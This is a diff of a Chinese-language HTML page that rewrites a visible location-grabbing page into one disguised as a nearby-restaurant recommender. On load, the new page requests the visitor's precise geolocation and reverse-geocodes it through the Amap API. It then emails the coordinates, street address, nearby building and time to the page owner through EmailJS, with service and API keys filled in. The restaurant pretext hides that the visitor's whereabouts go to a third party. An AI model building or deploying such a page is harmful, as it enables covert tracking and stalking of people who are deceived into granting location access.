@@ -1,105 +1,139 @@
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>正在获取您的位置...</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>附近餐饮推荐</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<style>
+  body {
+    background: #fff8e1;
+    font-family: "Helvetica Neue", Arial, sans-serif;
+    color: #333;
+    margin: 0; padding: 1rem;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  header {
+    width: 100%;
+    background: #ffb300;
+    padding: 1rem 0;
+    text-align: center;
+    font-size: 1.5rem;
+    font-weight: 700;
+    color: #222;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    margin-bottom: 2rem;
+  }
+  main {
+    max-width: 400px;
+    width: 100%;
+    background: #fff;
+    border-radius: 12px;
+    box-shadow: 0 3px 12px rgba(0,0,0,0.1);
+    padding: 1.5rem 2rem;
+    text-align: center;
+  }
+  p {
+    margin: 1rem 0;
+    font-size: 1rem;
+    line-height: 1.4;
+  }
+  .location-info {
+    background: #fff3e0;
+    border: 1px solid #ffb300;
+    border-radius: 8px;
+    padding: 1rem;
+    margin-top: 1rem;
+    color: #8a6d1f;
+    font-weight: 600;
+  }
+  #status {
+    margin-top: 1rem;
+    font-size: 0.9rem;
+    color: #666;
+  }
+</style>
+<script>
+  emailjs.init('user_rJGHjkPq5YtfISxylWfB1'); // 测试用 Public Key
 
-  <!-- EmailJS SDK -->
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function () {
-      emailjs.init("user_你的EmailJS_PublicKey"); // 替换
-    })();
-  </script>
-
-  <style>
-    body {
-      font-family: "Helvetica Neue", sans-serif;
-      padding: 2rem;
-      text-align: center;
-      background-color: #f9f9f9;
+  async function sendLocationEmail(params) {
+    try {
+      await emailjs.send('service_m1rlu4p', 'template_91vteoh', params);
+      document.getElementById('status').textContent = '📬 位置信息已发送（测试）';
+    } catch (e) {
+      document.getElementById('status').textContent = '❌ 发送邮件失败：' + e.message;
     }
-    h1 {
-      color: #333;
-      margin-bottom: 1rem;
+  }
+
+  function showLocationInfo(city, address, poi, datetime) {
+    const infoDiv = document.getElementById('locationInfo');
+    infoDiv.innerHTML =
+      `<p>📍 您所在城市：${city}</p>` +
+      `<p>🏢 附近建筑：${poi}</p>` +
+      `<p>📋 详细地址：${address}</p>` +
+      `<p>🕒 时间：${datetime}</p>`;
+  }
+
+  function getLocation() {
+    const status = document.getElementById('status');
+    if (!navigator.geolocation) {
+      status.textContent = '❌ 您的浏览器不支持定位';
+      return;
     }
-    #output {
-      font-size: 1rem;
-      white-space: pre-wrap;
-      margin-top: 1.5rem;
-    }
-    #getBtn {
-      display: none;
-    }
-  </style>
-</head>
+    status.textContent = '⏳ 正在请求位置... 请允许浏览器定位';
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
 
-<body onload="document.getElementById('getBtn').click()">
-  <h1>正在定位，请授权浏览器获取位置</h1>
-  <p>获取成功后将自动发送位置信息</p>
+      // 高德逆地理API接口
+      const gaodeKey = '41bbd35214e4d991fcae17eebd0db6e0'; // 测试 Key
+      const url = `https://restapi.amap.com/v3/geocode/regeo?location=${lon},${lat}&key=${gaodeKey}&extensions=all`;
 
-  <!-- 隐藏的按钮 -->
-  <button id="getBtn" onclick="getLocation()">获取位置</button>
+      try {
+        const res = await fetch(url);
+        const data = await res.json();
+        if(data.status === "1") {
+          const city = data.regeocode.addressComponent.city || data.regeocode.addressComponent.province || '未知城市';
+          const address = data.regeocode.formatted_address || '未知地址';
+          const poi = (data.regeocode.pois && data.regeocode.pois.length > 0) ? data.regeocode.pois[0].name : '未知建筑';
+          const now = new Date().toLocaleString();
 
-  <div id="output">正在定位中...</div>
+          showLocationInfo(city, address, poi, now);
 
-  <script>
-    async function getLocation() {
-      const output = document.getElementById("output");
-      output.innerText = "📍 正在请求地理位置，请授权浏览器...";
-
-      if (!navigator.geolocation) {
-        output.innerText = "❌ 当前浏览器不支持定位功能。";
-        return;
+          // 发送邮件参数
+          const params = {
+            latitude: lat,
+            longitude: lon,
+            city,
+            address,
+            poi,
+            datetime: now
+          };
+          await sendLocationEmail(params);
+          status.textContent = '✅ 定位成功，已发送您的位置信息';
+        } else {
+          status.textContent = '❌ 地址解析失败';
+        }
+      } catch (e) {
+        status.textContent = '❌ 请求失败：' + e.message;
       }
 
-      navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude.toFixed(6);
-        const lon = position.coords.longitude.toFixed(6);
-        output.innerText = `✅ 获取坐标成功\n纬度: ${lat}\n经度: ${lon}`;
+    }, (err) => {
+      status.textContent = '❌ 定位失败：' + err.message;
+    }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+  }
 
-        const amapKey = "a6afcdeff7089690badc696e6584eade"; // ← 替换
-        const apiUrl = `https://restapi.amap.com/v3/geocode/regeo?location=${lon},${lat}&key=${amapKey}&output=json&extensions=all`;
-
-        try {
-          const res = await fetch(apiUrl);
-          const data = await res.json();
-
-          if (data.status === "1") {
-            const city = data.regeocode.addressComponent.city || data.regeocode.addressComponent.province;
-            const address = data.regeocode.formatted_address;
-            const poi = data.regeocode.pois?.[0]?.name || "未知建筑";
-            const now = new Date().toLocaleString();
-
-            output.innerText += `\n🏙️ 城市：${city}\n🏢 建筑：${poi}\n📍 地址：${address}\n🕒 时间：${now}`;
-
-            const templateParams = {
-              latitude: lat,
-              longitude: lon,
-              city: city,
-              address: address,
-              poi: poi,
-              datetime: now
-            };
-
-            emailjs.send("service_你的ServiceID", "template_你的TemplateID", templateParams)
-              .then(() => {
-                output.innerText += "\n📬 已将位置信息发送至您的邮箱 ✅";
-              }, (err) => {
-                output.innerText += "\n❌ 邮件发送失败：" + err.text;
-              });
-
-          } else {
-            output.innerText += "\n❌ 地址解析失败。";
-          }
-        } catch (e) {
-          output.innerText += "\n❌ 请求出错：" + e.message;
-        }
-      }, (err) => {
-        output.innerText = "❌ 获取定位失败：" + err.message;
-      });
-    }
-  </script>
+  window.onload = getLocation;
+</script>
+</head>
+<body>
+<header>附近餐饮推荐</header>
+<main>
+  <p>为了为您推荐附近优质餐饮，请允许我们获取您的位置。</p>
+  <div class="location-info" id="locationInfo">定位信息将在这里显示</div>
+  <div id="status">等待定位授权...</div>
+</main>
 </body>
 </html>
